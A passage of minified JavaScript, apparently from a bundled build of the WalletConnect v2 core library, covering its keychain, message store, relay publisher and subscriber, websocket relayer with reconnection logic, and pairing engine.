this.getClientId()}'`),this.logger.error(t)}},this.getPayloadType=e=>P0($g(e).type),this.getPayloadSenderPublicKey=e=>{const t=$g(e);return t.senderPublicKey?xi(t.senderPublicKey,_i):void 0},this.core=e,this.logger=nr.generateChildLogger(t,this.name),this.keychain=r||new NZ(this.core,this.logger)}get context(){return nr.getLoggerContext(this.logger)}async setPrivateKey(e,t){return await this.keychain.set(e,t),e}getPrivateKey(e){return this.keychain.get(e)}async getClientSeed(){let e="";try{e=this.keychain.get(Ax)}catch{e=C2(),await this.keychain.set(Ax,e)}return tZ(e,"base16")}getSymKey(e){return this.keychain.get(e)}isInitialized(){if(!this.initialized){const{message:e}=je("NOT_INITIALIZED",this.name);throw new Error(e)}}}class PZ extends jG{constructor(e,t){super(e,t),this.logger=e,this.core=t,this.messages=new Map,this.name=lZ,this.version=uZ,this.initialized=!1,this.storagePrefix=Dc,this.init=async()=>{if(!this.initialized){this.logger.trace("Initialized");try{const e=await this.getRelayerMessages();typeof e<"u"&&(this.messages=e),this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",size:this.messages.size})}catch(e){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(e)}finally{this.initialized=!0}}},this.set=async(e,t)=>{this.isInitialized();const r=af(t);let n=this.messages.get(e);return typeof n>"u"&&(n={}),typeof n[r]<"u"||(n[r]=t,this.messages.set(e,n),await this.persist()),r},this.get=e=>{this.isInitialized();let t=this.messages.get(e);return typeof t>"u"&&(t={}),t},this.has=(e,t)=>{this.isInitialized();return typeof this.get(e)[af(t)]<"u"},this.del=async e=>{this.isInitialized(),this.messages.delete(e),await this.persist()},this.logger=nr.generateChildLogger(e,this.name),this.core=t}get context(){return nr.getLoggerContext(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}async setRelayerMessages(e){await this.core.storage.setItem(this.storageKey,X9(e))}async getRelayerMessages(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?eI(e):void 0}async persist(){await this.setRelayerMessages(this.messages)}isInitialized(){if(!this.initialized){const{message:e}=je("NOT_INITIALIZED",this.name);throw new Error(e)}}}class MZ extends UG{constructor(e,t){super(e,t),this.relayer=e,this.logger=t,this.events=new ai.EventEmitter,this.name=hZ,this.queue=new Map,this.publishTimeout=rt.toMiliseconds(rt.TEN_SECONDS),this.needsTransportRestart=!1,this.publish=async(e,t,r)=>{var n;this.logger.debug("Publishing Payload"),this.logger.trace({type:"method",method:"publish",params:{topic:e,message:t,opts:r}});try{const i=(null==r?void 0:r.ttl)||fZ,o=A2(r),s=(null==r?void 0:r.prompt)||!1,a=(null==r?void 0:r.tag)||0,c=(null==r?void 0:r.id)||bI().toString(),l={topic:e,message:t,opts:{ttl:i,relay:o,prompt:s,tag:a,id:c}},u=setTimeout((()=>this.queue.set(c,l)),this.publishTimeout);try{await await l0(this.rpcPublish(e,t,i,o,s,a,c),this.publishTimeout,"Failed to publish payload, please try again."),this.removeRequestFromQueue(c),this.relayer.events.emit(ni.publish,l)}catch(e){if(this.logger.debug("Publishing Payload stalled"),this.needsTransportRestart=!0,null!=(n=null==r?void 0:r.internal)&&n.throwOnFailedPublish)throw this.removeRequestFromQueue(c),e;return}finally{clearTimeout(u)}this.logger.debug("Successfully Published Payload"),this.logger.trace({type:"method",method:"publish",params:{topic:e,message:t,opts:r}})}catch(e){throw this.logger.debug("Failed to Publish Payload"),this.logger.error(e),e}},this.on=(e,t)=>{this.events.on(e,t)},this.once=(e,t)=>{this.events.once(e,t)},this.off=(e,t)=>{this.events.off(e,t)},this.removeListener=(e,t)=>{this.events.removeListener(e,t)},this.relayer=e,this.logger=nr.generateChildLogger(t,this.name),this.registerEventListeners()}get context(){return nr.getLoggerContext(this.logger)}rpcPublish(e,t,r,n,i,o,s){var a,c,l,u;const h={method:K1(n.protocol).publish,params:{topic:e,message:t,ttl:r,prompt:i,tag:o},id:s};return wi(null==(a=h.params)?void 0:a.prompt)&&(null==(c=h.params)||delete c.prompt),wi(null==(l=h.params)?void 0:l.tag)&&(null==(u=h.params)||delete u.tag),this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"message",direction:"outgoing",request:h}),this.relayer.request(h)}removeRequestFromQueue(e){this.queue.delete(e)}checkQueue(){this.queue.forEach((async e=>{const{topic:t,message:r,opts:n}=e;await this.publish(t,r,n)}))}registerEventListeners(){this.relayer.core.heartbeat.on(lh.HEARTBEAT_EVENTS.pulse,(()=>{if(this.needsTransportRestart)return this.needsTransportRestart=!1,void this.relayer.events.emit(ni.connection_stalled);this.checkQueue()})),this.relayer.on(ni.message_ack,(e=>{this.removeRequestFromQueue(e.id.toString())}))}}class kZ{constructor(){this.map=new Map,this.set=(e,t)=>{const r=this.get(e);this.exists(e,t)||this.map.set(e,[...r,t])},this.get=e=>this.map.get(e)||[],this.exists=(e,t)=>this.get(e).includes(t),this.delete=(e,t)=>{if(typeof t>"u")return void this.map.delete(e);if(!this.map.has(e))return;const r=this.get(e);if(!this.exists(e,t))return;const n=r.filter((e=>e!==t));n.length?this.map.set(e,n):this.map.delete(e)},this.clear=()=>{this.map.clear()}}get topics(){return Array.from(this.map.keys())}}var DZ=Object.defineProperty,$Z=Object.defineProperties,LZ=Object.getOwnPropertyDescriptors,Tx=Object.getOwnPropertySymbols,BZ=Object.prototype.hasOwnProperty,FZ=Object.prototype.propertyIsEnumerable,Nx=(e,t,r)=>t in e?DZ(e,t,{enumerable:!0,configurable:!0,writable:!0,value:r}):e[t]=r,rd=(e,t)=>{for(var r in t||(t={}))BZ.call(t,r)&&Nx(e,r,t[r]);if(Tx)for(var r of Tx(t))FZ.call(t,r)&&Nx(e,r,t[r]);return e},$w=(e,t)=>$Z(e,LZ(t));class jZ extends HG{constructor(e,t){super(e,t),this.relayer=e,this.logger=t,this.subscriptions=new Map,this.topicMap=new kZ,this.events=new ai.EventEmitter,this.name=_Z,this.version=EZ,this.pending=new Map,this.cached=[],this.initialized=!1,this.pendingSubscriptionWatchLabel="pending_sub_watch_label",this.pollingInterval=20,this.storagePrefix=Dc,this.subscribeTimeout=1e4,this.restartInProgress=!1,this.batchSubscribeTopicsLimit=500,this.init=async()=>{this.initialized||(this.logger.trace("Initialized"),this.registerEventListeners(),this.clientId=await this.relayer.core.crypto.getClientId())},this.subscribe=async(e,t)=>{await this.restartToComplete(),this.isInitialized(),this.logger.debug("Subscribing Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:e,opts:t}});try{const r=A2(t),n={topic:e,relay:r};this.pending.set(e,n);const i=await this.rpcSubscribe(e,r);return this.onSubscribe(i,n),this.logger.debug("Successfully Subscribed Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:e,opts:t}}),i}catch(e){throw this.logger.debug("Failed to Subscribe Topic"),this.logger.error(e),e}},this.unsubscribe=async(e,t)=>{await this.restartToComplete(),this.isInitialized(),typeof(null==t?void 0:t.id)<"u"?await this.unsubscribeById(e,t.id,t):await this.unsubscribeByTopic(e,t)},this.isSubscribed=async e=>!!this.topics.includes(e)||await new Promise(((t,r)=>{const n=new rt.Watch;n.start(this.pendingSubscriptionWatchLabel);const i=setInterval((()=>{!this.pending.has(e)&&this.topics.includes(e)&&(clearInterval(i),n.stop(this.pendingSubscriptionWatchLabel),t(!0)),n.elapsed(this.pendingSubscriptionWatchLabel)>=xZ&&(clearInterval(i),n.stop(this.pendingSubscriptionWatchLabel),r(new Error("Subscription resolution timeout")))}),this.pollingInterval)})).catch((()=>!1)),this.on=(e,t)=>{this.events.on(e,t)},this.once=(e,t)=>{this.events.once(e,t)},this.off=(e,t)=>{this.events.off(e,t)},this.removeListener=(e,t)=>{this.events.removeListener(e,t)},this.restart=async()=>{this.restartInProgress=!0,await this.restore(),await this.reset(),this.restartInProgress=!1},this.relayer=e,this.logger=nr.generateChildLogger(t,this.name),this.clientId=""}get context(){return nr.getLoggerContext(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.relayer.core.customStoragePrefix+"//"+this.name}get length(){return this.subscriptions.size}get ids(){return Array.from(this.subscriptions.keys())}get values(){return Array.from(this.subscriptions.values())}get topics(){return this.topicMap.topics}hasSubscription(e,t){let r=!1;try{r=this.getSubscription(e).topic===t}catch{}return r}onEnable(){this.cached=[],this.initialized=!0}onDisable(){this.cached=this.values,this.subscriptions.clear(),this.topicMap.clear()}async unsubscribeByTopic(e,t){const r=this.topicMap.get(e);await Promise.all(r.map((async r=>await this.unsubscribeById(e,r,t))))}async unsubscribeById(e,t,r){this.logger.debug("Unsubscribing Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:t,opts:r}});try{const n=A2(r);await this.rpcUnsubscribe(e,t,n);const i=nn("USER_DISCONNECTED",`${this.name}, ${e}`);await this.onUnsubscribe(e,t,i),this.logger.debug("Successfully Unsubscribed Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:t,opts:r}})}catch(e){throw this.logger.debug("Failed to Unsubscribe Topic"),this.logger.error(e),e}}async rpcSubscribe(e,t){const r={method:K1(t.protocol).subscribe,params:{topic:e}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:r});try{await await l0(this.relayer.request(r),this.subscribeTimeout)}catch{this.logger.debug("Outgoing Relay Subscribe Payload stalled"),this.relayer.events.emit(ni.connection_stalled)}return af(e+this.clientId)}async rpcBatchSubscribe(e){if(!e.length)return;const t={method:K1(e[0].relay.protocol).batchSubscribe,params:{topics:e.map((e=>e.topic))}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:t});try{return await await l0(this.relayer.request(t),this.subscribeTimeout)}catch{this.logger.debug("Outgoing Relay Payload stalled"),this.relayer.events.emit(ni.connection_stalled)}}rpcUnsubscribe(e,t,r){const n={method:K1(r.protocol).unsubscribe,params:{topic:e,id:t}};return this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:n}),this.relayer.request(n)}onSubscribe(e,t){this.setSubscription(e,$w(rd({},t),{id:e})),this.pending.delete(t.topic)}onBatchSubscribe(e){e.length&&e.forEach((e=>{this.setSubscription(e.id,rd({},e)),this.pending.delete(e.topic)}))}async onUnsubscribe(e,t,r){this.events.removeAllListeners(t),this.hasSubscription(t,e)&&this.deleteSubscription(t,r),await this.relayer.messages.del(e)}async setRelayerSubscriptions(e){await this.relayer.core.storage.setItem(this.storageKey,e)}async getRelayerSubscriptions(){return await this.relayer.core.storage.getItem(this.storageKey)}setSubscription(e,t){this.subscriptions.has(e)||(this.logger.debug("Setting subscription"),this.logger.trace({type:"method",method:"setSubscription",id:e,subscription:t}),this.addSubscription(e,t))}addSubscription(e,t){this.subscriptions.set(e,rd({},t)),this.topicMap.set(t.topic,e),this.events.emit(co.created,t)}getSubscription(e){this.logger.debug("Getting subscription"),this.logger.trace({type:"method",method:"getSubscription",id:e});const t=this.subscriptions.get(e);if(!t){const{message:t}=je("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(t)}return t}deleteSubscription(e,t){this.logger.debug("Deleting subscription"),this.logger.trace({type:"method",method:"deleteSubscription",id:e,reason:t});const r=this.getSubscription(e);this.subscriptions.delete(e),this.topicMap.delete(r.topic,e),this.events.emit(co.deleted,$w(rd({},r),{reason:t}))}async persist(){await this.setRelayerSubscriptions(this.values),this.events.emit(co.sync)}async reset(){if(this.cached.length){const e=Math.ceil(this.cached.length/this.batchSubscribeTopicsLimit);for(let t=0;t<e;t++){const e=this.cached.splice(0,this.batchSubscribeTopicsLimit);await this.batchSubscribe(e)}}this.events.emit(co.resubscribed)}async restore(){try{const e=await this.getRelayerSubscriptions();if(typeof e>"u"||!e.length)return;if(this.subscriptions.size){const{message:e}=je("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(e),this.logger.error(`${this.name}: ${JSON.stringify(this.values)}`),new Error(e)}this.cached=e,this.logger.debug(`Successfully Restored subscriptions for ${this.name}`),this.logger.trace({type:"method",method:"restore",subscriptions:this.values})}catch(e){this.logger.debug(`Failed to Restore subscriptions for ${this.name}`),this.logger.error(e)}}async batchSubscribe(e){if(!e.length)return;const t=await this.rpcBatchSubscribe(e);ta(t)&&this.onBatchSubscribe(t.map(((t,r)=>$w(rd({},e[r]),{id:t}))))}async onConnect(){this.restartInProgress||(await this.restart(),this.onEnable())}onDisconnect(){this.onDisable()}async checkPending(){if(!this.initialized||this.relayer.transportExplicitlyClosed)return;const e=[];this.pending.forEach((t=>{e.push(t)})),await this.batchSubscribe(e)}registerEventListeners(){this.relayer.core.heartbeat.on(lh.HEARTBEAT_EVENTS.pulse,(async()=>{await this.checkPending()})),this.relayer.on(ni.connect,(async()=>{await this.onConnect()})),this.relayer.on(ni.disconnect,(()=>{this.onDisconnect()})),this.events.on(co.created,(async e=>{const t=co.created;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,data:e}),await this.persist()})),this.events.on(co.deleted,(async e=>{const t=co.deleted;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,data:e}),await this.persist()}))}isInitialized(){if(!this.initialized){const{message:e}=je("NOT_INITIALIZED",this.name);throw new Error(e)}}async restartToComplete(){this.restartInProgress&&await new Promise((e=>{const t=setInterval((()=>{this.restartInProgress||(clearInterval(t),e())}),this.pollingInterval)}))}}var UZ=Object.defineProperty,Ox=Object.getOwnPropertySymbols,WZ=Object.prototype.hasOwnProperty,zZ=Object.prototype.propertyIsEnumerable,Px=(e,t,r)=>t in e?UZ(e,t,{enumerable:!0,configurable:!0,writable:!0,value:r}):e[t]=r,HZ=(e,t)=>{for(var r in t||(t={}))WZ.call(t,r)&&Px(e,r,t[r]);if(Ox)for(var r of Ox(t))zZ.call(t,r)&&Px(e,r,t[r]);return e};class qZ extends WG{constructor(e){super(e),this.protocol="wc",this.version=2,this.events=new ai.EventEmitter,this.name=pZ,this.transportExplicitlyClosed=!1,this.initialized=!1,this.connectionAttemptInProgress=!1,this.connectionStatusPollingInterval=20,this.staleConnectionErrors=["socket hang up","socket stalled"],this.hasExperiencedNetworkDisruption=!1,this.request=async e=>{this.logger.debug("Publishing Request Payload");try{return await this.toEstablishConnection(),await this.provider.request(e)}catch(e){throw this.logger.debug("Failed to Publish Request"),this.logger.error(e),e}},this.onPayloadHandler=e=>{this.onProviderPayload(e)},this.onConnectHandler=()=>{this.events.emit(ni.connect)},this.onDisconnectHandler=()=>{this.onProviderDisconnect()},this.onProviderErrorHandler=e=>{this.logger.error(e),this.events.emit(ni.error,e),this.logger.info("Fatal socket error received, closing transport"),this.transportClose()},this.registerProviderListeners=()=>{this.provider.on(Ca.payload,this.onPayloadHandler),this.provider.on(Ca.connect,this.onConnectHandler),this.provider.on(Ca.disconnect,this.onDisconnectHandler),this.provider.on(Ca.error,this.onProviderErrorHandler)},this.core=e.core,this.logger=typeof e.logger<"u"&&"string"!=typeof e.logger?nr.generateChildLogger(e.logger,this.name):nr.pino(nr.getDefaultLoggerOptions({level:e.logger||dZ})),this.messages=new PZ(this.logger,e.core),this.subscriber=new jZ(this,this.logger),this.publisher=new MZ(this,this.logger),this.relayUrl=(null==e?void 0:e.relayUrl)||kI,this.projectId=e.projectId,this.provider={}}async init(){this.logger.trace("Initialized"),this.registerEventListeners(),await this.createProvider(),await Promise.all([this.messages.init(),this.subscriber.init()]);try{await this.transportOpen()}catch{this.logger.warn(`Connection via ${this.relayUrl} failed, attempting to connect via failover domain ${Ix}...`),await this.restartTransport(Ix)}this.initialized=!0,setTimeout((async()=>{0===this.subscriber.topics.length&&(this.logger.info("No topics subscribed to after init, closing transport"),await this.transportClose(),this.transportExplicitlyClosed=!1)}),bZ)}get context(){return nr.getLoggerContext(this.logger)}get connected(){return this.provider.connection.connected}get connecting(){return this.provider.connection.connecting}async publish(e,t,r){this.isInitialized(),await this.publisher.publish(e,t,r),await this.recordMessageEvent({topic:e,message:t,publishedAt:Date.now()})}async subscribe(e,t){var r;this.isInitialized();let n,i=(null==(r=this.subscriber.topicMap.get(e))?void 0:r[0])||"";if(i)return i;const o=t=>{t.topic===e&&(this.subscriber.off(co.created,o),n())};return await Promise.all([new Promise((e=>{n=e,this.subscriber.on(co.created,o)})),new Promise((async r=>{i=await this.subscriber.subscribe(e,t),r()}))]),i}async unsubscribe(e,t){this.isInitialized(),await this.subscriber.unsubscribe(e,t)}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}off(e,t){this.events.off(e,t)}removeListener(e,t){this.events.removeListener(e,t)}async transportClose(){this.transportExplicitlyClosed=!0,this.hasExperiencedNetworkDisruption&&this.connected?await l0(this.provider.disconnect(),1e3,"provider.disconnect()").catch((()=>this.onProviderDisconnect())):this.connected&&await this.provider.disconnect()}async transportOpen(e){if(this.transportExplicitlyClosed=!1,await this.confirmOnlineStateOrThrow(),!this.connectionAttemptInProgress){e&&e!==this.relayUrl&&(this.relayUrl=e,await this.transportClose(),await this.createProvider()),this.connectionAttemptInProgress=!0;try{await Promise.all([new Promise((e=>{if(!this.initialized)return e();this.subscriber.once(co.resubscribed,(()=>{e()}))})),new Promise((async(e,t)=>{try{await l0(this.provider.connect(),1e4,`Socket stalled when trying to connect to ${this.relayUrl}`)}catch(e){return void t(e)}e()}))])}catch(e){this.logger.error(e);const t=e;if(!this.isConnectionStalled(t.message))throw e;this.provider.events.emit(Ca.disconnect)}finally{this.connectionAttemptInProgress=!1,this.hasExperiencedNetworkDisruption=!1}}}async restartTransport(e){await this.confirmOnlineStateOrThrow(),!this.connectionAttemptInProgress&&(this.relayUrl=e||this.relayUrl,await this.transportClose(),await this.createProvider(),await this.transportOpen())}async confirmOnlineStateOrThrow(){if(!await QE())throw new Error("No internet connection detected. Please restart your network and try again.")}isConnectionStalled(e){return this.staleConnectionErrors.some((t=>e.includes(t)))}async createProvider(){this.provider.connection&&this.unregisterProviderListeners();const e=await this.core.crypto.signJWT(this.relayUrl);this.provider=new Ka(new TK(nV({sdkVersion:mZ,protocol:this.protocol,version:this.version,relayUrl:this.relayUrl,projectId:this.projectId,auth:e,useOnCloseEvent:!0}))),this.registerProviderListeners()}async recordMessageEvent(e){const{topic:t,message:r}=e;await this.messages.set(t,r)}async shouldIgnoreMessageEvent(e){const{topic:t,message:r}=e;if(!r||0===r.length)return this.logger.debug(`Ignoring invalid/empty message: ${r}`),!0;if(!await this.subscriber.isSubscribed(t))return this.logger.debug(`Ignoring message for non-subscribed topic ${t}`),!0;const n=this.messages.has(t,r);return n&&this.logger.debug(`Ignoring duplicate message: ${r}`),n}async onProviderPayload(e){if(this.logger.debug("Incoming Relay Payload"),this.logger.trace({type:"payload",direction:"incoming",payload:e}),n_(e)){if(!e.method.endsWith(gZ))return;const t=e.params,{topic:r,message:n,publishedAt:i}=t.data,o={topic:r,message:n,publishedAt:i};this.logger.debug("Emitting Relayer Payload"),this.logger.trace(HZ({type:"event",event:t.id},o)),this.events.emit(t.id,o),await this.acknowledgePayload(e),await this.onMessageEvent(o)}else Dv(e)&&this.events.emit(ni.message_ack,e)}async onMessageEvent(e){await this.shouldIgnoreMessageEvent(e)||(this.events.emit(ni.message,e),await this.recordMessageEvent(e))}async acknowledgePayload(e){const t=r_(e.id,!0);await this.provider.connection.send(t)}unregisterProviderListeners(){this.provider.off(Ca.payload,this.onPayloadHandler),this.provider.off(Ca.connect,this.onConnectHandler),this.provider.off(Ca.disconnect,this.onDisconnectHandler),this.provider.off(Ca.error,this.onProviderErrorHandler)}async registerEventListeners(){this.events.on(ni.connection_stalled,(()=>{this.restartTransport().catch((e=>this.logger.error(e)))}));let e=await QE();JV((async t=>{this.initialized&&e!==t&&(e=t,t?await this.restartTransport().catch((e=>this.logger.error(e))):(this.hasExperiencedNetworkDisruption=!0,await this.transportClose().catch((e=>this.logger.error(e)))))}))}onProviderDisconnect(){this.events.emit(ni.disconnect),this.attemptToReconnect()}attemptToReconnect(){this.transportExplicitlyClosed||(this.logger.info("attemptToReconnect called. Connecting..."),setTimeout((async()=>{await this.restartTransport().catch((e=>this.logger.error(e)))}),rt.toMiliseconds(vZ)))}isInitialized(){if(!this.initialized){const{message:e}=je("NOT_INITIALIZED",this.name);throw new Error(e)}}async toEstablishConnection(){if(await this.confirmOnlineStateOrThrow(),!this.connected){if(this.connectionAttemptInProgress)return await new Promise((e=>{const t=setInterval((()=>{this.connected&&(clearInterval(t),e())}),this.connectionStatusPollingInterval)}));await this.restartTransport()}}}var VZ=Object.defineProperty,Mx=Object.getOwnPropertySymbols,GZ=Object.prototype.hasOwnProperty,KZ=Object.prototype.propertyIsEnumerable,kx=(e,t,r)=>t in e?VZ(e,t,{enumerable:!0,configurable:!0,writable:!0,value:r}):e[t]=r,Dx=(e,t)=>{for(var r in t||(t={}))GZ.call(t,r)&&kx(e,r,t[r]);if(Mx)for(var r of Mx(t))KZ.call(t,r)&&kx(e,r,t[r]);return e};class Lv extends zG{constructor(e,t,r,n=Dc,i=void 0){super(e,t,r,n),this.core=e,this.logger=t,this.name=r,this.map=new Map,this.version=wZ,this.cached=[],this.initialized=!1,this.storagePrefix=Dc,this.init=async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach((e=>{this.getKey&&null!==e&&!wi(e)?this.map.set(this.getKey(e),e):AV(e)?this.map.set(e.id,e):IV(e)&&this.map.set(e.topic,e)})),this.cached=[],this.initialized=!0)},this.set=async(e,t)=>{this.isInitialized(),this.map.has(e)?await this.update(e,t):(this.logger.debug("Setting value"),this.logger.trace({type:"method",method:"set",key:e,value:t}),this.map.set(e,t),await this.persist())},this.get=e=>(this.isInitialized(),this.logger.debug("Getting value"),this.logger.trace({type:"method",method:"get",key:e}),this.getData(e)),this.getAll=e=>(this.isInitialized(),e?this.values.filter((t=>Object.keys(e).every((r=>OK(t[r],e[r]))))):this.values),this.update=async(e,t)=>{this.isInitialized(),this.logger.debug("Updating value"),this.logger.trace({type:"method",method:"update",key:e,update:t});const r=Dx(Dx({},this.getData(e)),t);this.map.set(e,r),await this.persist()},this.delete=async(e,t)=>{this.isInitialized(),this.map.has(e)&&(this.logger.debug("Deleting value"),this.logger.trace({type:"method",method:"delete",key:e,reason:t}),this.map.delete(e),await this.persist())},this.logger=nr.generateChildLogger(t,this.name),this.storagePrefix=n,this.getKey=i}get context(){return nr.getLoggerContext(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.map.size}get keys(){return Array.from(this.map.keys())}get values(){return Array.from(this.map.values())}async setDataStore(e){await this.core.storage.setItem(this.storageKey,e)}async getDataStore(){return await this.core.storage.getItem(this.storageKey)}getData(e){const t=this.map.get(e);if(!t){const{message:t}=je("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.error(t),new Error(t)}return t}async persist(){await this.setDataStore(this.values)}async restore(){try{const e=await this.getDataStore();if(typeof e>"u"||!e.length)return;if(this.map.size){const{message:e}=je("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(e),new Error(e)}this.cached=e,this.logger.debug(`Successfully Restored value for ${this.name}`),this.logger.trace({type:"method",method:"restore",value:this.values})}catch(e){this.logger.debug(`Failed to Restore value for ${this.name}`),this.logger.error(e)}}isInitialized(){if(!this.initialized){const{message:e}=je("NOT_INITIALIZED",this.name);throw new Error(e)}}}class JZ{constructor(e,t){this.core=e,this.logger=t,this.name=SZ,this.version=CZ,this.events=new U3,this.initialized=!1,this.storagePrefix=Dc,this.ignoredPayloadTypes=[au],this.registeredMethods=[],this.init=async()=>{this.initialized||(await this.pairings.init(),await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.initialized=!0,this.logger.trace("Initialized"))},this.register=({methods:e})=>{this.isInitialized(),this.registeredMethods=[...new Set([...this.registeredMethods,...e])]},this.create=async()=>{this.isInitialized();const e=C2(),t=await this.core.crypto.setSymKey(e),r=uo(rt.FIVE_MINUTES),n={protocol:MI},i={topic:t,expiry:r,relay:n,active:!1},o=vV({protocol:this.core.protocol,version:this.core.version,topic:t,symKey:e,relay:n});return await this.pairings.set(t,i),await this.core.relayer.subscribe(t),this.core.expirer.set(t,r),{topic:t,uri:o}},this.pair=async e=>{this.isInitialized(),this.isValidPair(e);const{topic:t,symKey:r,relay:n}=dV(e.uri);let i;if(this.pairings.keys.includes(t)&&(i=this.pairings.get(t),i.active))throw new Error(`Pairing already exists: ${t}. Please try again with a new connection URI.`);this.core.crypto.keychain.has(t)||(await this.core.crypto.setSymKey(r,t),await this.core.relayer.subscribe(t,{relay:n}));const o=uo(rt.FIVE_MINUTES),s={topic:t,relay:n,expiry:o,active:!1};return await this.pairings.set(t,s),this.core.expirer.set(t,o),e.activatePairing&&await this.activate({topic:t}),this.events.emit(_d.create,s),s},this.activate=async({topic:e})=>{this.isInitialized();const t=uo(rt.THIRTY_DAYS);await this.pairings.update(e,{active:!0,expiry:t}),this.core.expirer.set(e,t)},this.ping=async e=>{this.isInitialized(),await this.isValidPing(e);const{topic:t}=e;if(this.pairings.keys.includes(t)){const e=await this.sendRequest(t,"wc_pairingPing",{}),{done:r,resolve:n,reject:i}=Qu();this.events.once(fn("pairing_ping",e),(({error:e})=>{e?i(e):n()})),await r()}},this.updateExpiry=async({topic:e,expiry:t})=>{this.isInitialized(),await this.pairings.update(e,{expiry:t})},this.updateMetadata=async({topic:e,metadata:t})=>{this.isInitialized(),await this.pairings.update(e,{peerMetadata:t})},this.getPairings=()=>(this.isInitialized(),this.pairings.values),this.disconnect=async e=>{this.isInitialized(),await this.isValidDisconnect(e);const{topic:t}=e;this.pairings.keys.includes(t)&&(await this.sendRequest(t,"wc_pairingDelete",nn("USER_DISCONNECTED")),await this.deletePairing(t))},this.sendRequest=async(e,t,r)=>{const n=lf(t,r),i=await this.core.crypto.encode(e,n),o=td[t].req;return this.core.history.set(e,n),this.core.relayer.publish(e,i,o),n.id},this.sendResult=async(e,t,r)=>{const n=r_(e,r),i=await this.core.crypto.encode(t,n),o=await this.core.history.get(t,e),s=td[o.request.method].res;await this.core.relayer.publish(t,i,s),await this.core.history.resolve(n)},this.sendError=async(e,t,r)=>{const n=kv(e,r),i=await this.core.crypto.encode(t,n),o=await this.core.history.get(t,e),s=td[o.request.method]?td[o.request.method].res:td.unregistered_method.res;await this.core.relayer.publish(t,i,s),await this.core.history.resolve(n)},this.deletePairing=async(e,t)=>{await this.core.relayer.unsubscribe(e),await Promise.all([this.pairings.delete(e,nn("USER_DISCONNECTED")),this.core.crypto.deleteSymKey(e),t?Promise.resolve():this.core.expirer.del(e)])},this.cleanup=async()=>{const e=this.pairings.getAll().filter((e=>vc(e.expiry)));await Promise.all(e.map((e=>this.deletePairing(e.topic))))},this.onRelayEventRequest=e=>{const{topic:t,payload:r}=e;switch(r.method){case"wc_pairingPing":return this.onPairingPingRequest(t,r);case"wc_pairingDelete":return this.onPairingDeleteRequest(t,r);default:return this.onUnknownRpcMethodRequest(t,r)}},this.onRelayEventResponse=async e=>{const{topic:t,payload:r}=e,n=(await this.core.history.get(t,r.id)).request.method;return"wc_pairingPing"===n?this.onPairingPingResponse(t,r):this.onUnknownRpcMethodResponse(n)},this.onPairingPingRequest=async(e,t)=>{const{id:r}=t;try{this.isValidPing({topic:e}),await this.sendResult(r,e,!0),this.events.emit(_d.ping,{id:r,topic:e})}catch(t){await this.sendError(r,e,t),this.logger.error(t)}},this.onPairingPingResponse=(e,t)=>{const{id:r}=t;setTimeout((()=>{Ra(t)?this.events.emit(fn("pairing_ping",r),{}):fo(t)&&this.events.emit(fn("pairing_ping",r),{error:t.error})}),500)},this.onPairingDeleteRequest=async(e,t)=>{const{id:r}=t;try{this.isValidDisconnect({topic:e}),await this.deletePairing(e),this.events.emit(_d.delete,{id:r,topic:e})}catch(t){await this.sendError(r,e,t),this.logger.error(t)}},this.onUnknownRpcMethodRequest=async(e,t)=>{const{id:r,method:n}=t;try{if(this.registeredMethods.includes(n))return;const t=nn("WC_METHOD_UNSUPPORTED",n);await this.sendError(r,e,t),this.logger.error(t)}catch(t){await this.sendError(r,e,t),this.logger.error(t)}},this.onUnknownRpcMethodResponse=e=>{this.registeredMethods.includes(e)||this.logger.error(nn("WC_METHOD_UNSUPPORTED",e))},this.isValidPair=e=>{if(!ji(e)){const{message:t}=je("MISSING_OR_INVALID",`pair() params: ${e}`);throw new Error(t)}if(!CV(e.uri)){const{message:t}=je("MISSING_OR_INVALID",`pair() uri: ${e.uri}`);throw new Error(t)}},this.isValidPing=async e=>{if(!ji(e)){const{message:t}=je("MISSING_OR_INVALID",`ping() params: ${e}`);throw new Error(t)}const{topic:t}=e;await this.isValidPairingTopic(t)},this.isValidDisconnect=async e=>{if(!ji(e)){const{message:t}=je("MISSING_OR_INVALID",`disconnect() params: ${e}`);throw new Error(t)}const{topic:t}=e;await this.isValidPairingTopic(t)},this.isValidPairingTopic=async e=>{if(!Nn(e,!1)){const{message:t}=je("MISSING_OR_INVALID",`pairing topic should be a string: ${e}`);throw new Error(t)}if(!this.pairings.keys.includes(e)){const{message:t}=je("NO_MATCHING_KEY",`pairing topic doesn't exist: ${e}`);throw new Error(t)}if(vc(this.pairings.get(e).expiry)){await this.deletePairing(e);const{message:t}=je("EXPIRED",`pairing topic: ${e}`);throw new Error(t)}},this.core=e,this.logger=nr.generateChildLogger(t,this.name),this.pairings=new Lv(this.core,this.logger,this.name,this.storagePrefix)}get context(){return nr.getLoggerContext(this.logger)}isInitialized(){if(!this.initialized){const{message:e}=je("NOT_INITIALIZED",this.name);throw new Error(e)}}registerRelayerEvents(){this.core.relayer.on(ni.message,(async e=>{const{topic:t,message:r}=e;if(!this.pairings.keys.includes(t)||this.ignoredPayloadTypes.includes(this.core.crypto.getPayloadType(r)))return;const n=await 